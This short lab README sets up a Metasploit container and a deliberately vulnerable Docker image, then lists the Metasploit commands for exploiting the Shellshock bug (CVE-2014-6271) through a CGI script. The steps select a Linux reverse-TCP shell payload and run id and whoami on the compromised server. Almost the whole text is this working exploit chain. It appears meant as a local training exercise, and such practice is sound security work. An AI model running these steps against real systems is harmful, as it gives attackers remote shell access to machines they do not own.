Launch metasploit:

```shell
docker-compose run -p 8880:8880 ms
```

Launch shellshock-vulnerable server:

```shell
docker run -p 80:80 hmlio/vaas-cve-2014-6271
```

Find out machine IP:

```shell
docker inspect -f "{{ .NetworkSettings.IPAddress }}" <MACHINE_ID>
```

In Metasploit:

```metasploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec
options
set RHOSTS <MACHINE-IP>
set TARGETURI /cgi-bin/stats
show payloads
set payload linux/x86/shell/reverse_tcp
options
check
exploit
id
whoami
```
